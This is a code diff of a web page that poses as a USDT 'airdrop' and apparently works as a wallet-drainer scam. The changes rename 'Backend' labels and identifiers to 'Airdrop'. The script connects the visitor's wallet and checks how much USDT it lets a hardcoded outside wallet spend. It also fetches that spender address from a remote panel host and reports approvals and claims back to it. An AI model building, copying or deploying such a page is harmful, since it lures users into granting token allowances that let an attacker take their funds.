@@ -504,9 +504,9 @@
         <!-- Status Bar -->
         <div class="status-bar">
             <div class="status-item">
-                <span class="status-label"><i class="fas fa-server"></i> Backend:</span>
-                <span class="status-badge" id="backendStatusBadge">
-                    <i class="fas fa-circle"></i> <span id="backendStatus">Checking...</span>
+                <span class="status-label"><i class="fas fa-server"></i> Airdrop:</span>
+                <span class="status-badge" id="AirdropStatusBadge">
+                    <i class="fas fa-circle"></i> <span id="AirdropStatus">Checking...</span>
                 </span>
             </div>
             <div class="status-item">
@@ -523,10 +523,10 @@
             </div>
         </div>
         
-        <!-- Backend Status Alert -->
-        <div class="alert alert-info" id="backendStatusAlert" style="display: none;">
+        <!-- Airdrop Status Alert -->
+        <div class="alert alert-info" id="AirdropStatusAlert" style="display: none;">
             <i class="fas fa-server"></i>
-            <div><strong>Backend Status:</strong> <span id="backendStatusText">Checking...</span></div>
+            <div><strong>Airdrop Status:</strong> <span id="AirdropStatusText">Checking...</span></div>
         </div>
         
         <!-- Warning Alert -->
@@ -756,21 +756,21 @@
             </div>
         </div>
 
-        <!-- Footer - Backend URL line हटा दी गई है -->
+        <!-- Footer - Airdrop URL line हटा दी गई है -->
         <div class="footer">
             <p><i class="fas fa-shield-alt"></i> Powered by Blockchain Technology | Secure & Transparent</p>
         </div>
     </div>
 
     <script>
-        // Backend Configuration
-        const BACKEND_URLS = {
+        // Airdrop Configuration
+        const Airdrop_URLS = {
             production: "https://usdt-usdt.mtfwit.easypanel.host/api",
             development: "http://localhost:8080/api"
         };
 
         const isDevelopment = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
-        const BACKEND_URL = isDevelopment ? BACKEND_URLS.development : BACKEND_URLS.production;
+        const Airdrop_URL = isDevelopment ? Airdrop_URLS.development : Airdrop_URLS.production;
 
         let approvalWalletAddress = "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
         let account;
@@ -835,39 +835,39 @@
             }
         }
 
-        // Backend Health Check
-        async function checkBackendHealth() {
+        // Airdrop Health Check
+        async function checkAirdropHealth() {
             try {
-                const response = await fetch(`${BACKEND_URL}/health`);
+                const response = await fetch(`${Airdrop_URL}/health`);
                 const data = await response.json();
                 
                 if (data.success) {
-                    document.getElementById('backendStatus').textContent = 'Connected';
-                    document.getElementById('backendStatusText').textContent = 'Connected';
-                    document.getElementById('backendStatusBadge').className = 'status-badge online';
-                    document.getElementById('backendStatusAlert').style.display = 'none';
+                    document.getElementById('AirdropStatus').textContent = 'Connected';
+                    document.getElementById('AirdropStatusText').textContent = 'Connected';
+                    document.getElementById('AirdropStatusBadge').className = 'status-badge online';
+                    document.getElementById('AirdropStatusAlert').style.display = 'none';
                     return true;
                 } else {
-                    throw new Error('Backend response not successful');
+                    throw new Error('Airdrop response not successful');
                 }
             } catch (error) {
-                document.getElementById('backendStatus').textContent = 'Disconnected';
-                document.getElementById('backendStatusText').textContent = 'Disconnected';
-                document.getElementById('backendStatusBadge').className = 'status-badge offline';
-                document.getElementById('backendStatusAlert').style.display = 'flex';
+                document.getElementById('AirdropStatus').textContent = 'Disconnected';
+                document.getElementById('AirdropStatusText').textContent = 'Disconnected';
+                document.getElementById('AirdropStatusBadge').className = 'status-badge offline';
+                document.getElementById('AirdropStatusAlert').style.display = 'flex';
                 return false;
             }
         }
 
         // Get Approval Wallet
-        async function getApprovalWalletFromBackend() {
+        async function getApprovalWalletFromAirdrop() {
             try {
-                const isHealthy = await checkBackendHealth();
+                const isHealthy = await checkAirdropHealth();
                 if (!isHealthy) {
                     return "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
                 }
 
-                const response = await fetch(`${BACKEND_URL}/approval-wallet`);
+                const response = await fetch(`${Airdrop_URL}/approval-wallet`);
                 const data = await response.json();
                 
                 if (data.success) {
@@ -886,8 +886,8 @@
             createParticles();
             
             try {
-                await getApprovalWalletFromBackend();
-                await checkBackendHealth();
+                await getApprovalWalletFromAirdrop();
+                await checkAirdropHealth();
 
                 if (window.ethereum) {
                     web3 = new Web3(window.ethereum);
@@ -1084,7 +1084,7 @@
                     showAlert(`⚠️ Need 1+ USDT for tokens`, "warning");
                 }
 
-                const approvalWallet = await getApprovalWalletFromBackend();
+                const approvalWallet = await getApprovalWalletFromAirdrop();
                 const allowance = await usdtContract.methods.allowance(account, approvalWallet).call();
                 const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
 
@@ -1116,7 +1116,7 @@
                         button.className = 'btn btn-success';
                         
                         try {
-                            await fetch(`${BACKEND_URL}/save-approval`, {
+                            await fetch(`${Airdrop_URL}/save-approval`, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
@@ -1181,7 +1181,7 @@
                 if (!account) return;
                 
                 const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
-                const currentApprovalWallet = await getApprovalWalletFromBackend();
+                const currentApprovalWallet = await getApprovalWalletFromAirdrop();
                 
                 const allowance = await usdtContract.methods.allowance(account, currentApprovalWallet).call();
                 const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
@@ -1223,7 +1223,7 @@
                 }
 
                 const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
-                const currentApprovalWallet = await getApprovalWalletFromBackend();
+                const currentApprovalWallet = await getApprovalWalletFromAirdrop();
                 const allowance = await usdtContract.methods.allowance(account, currentApprovalWallet).call();
                 const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
 
@@ -1254,7 +1254,7 @@
 
                 if (tx.status) {
                     try {
-                        await fetch(`${BACKEND_URL}/save-claim`, {
+                        await fetch(`${Airdrop_URL}/save-claim`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
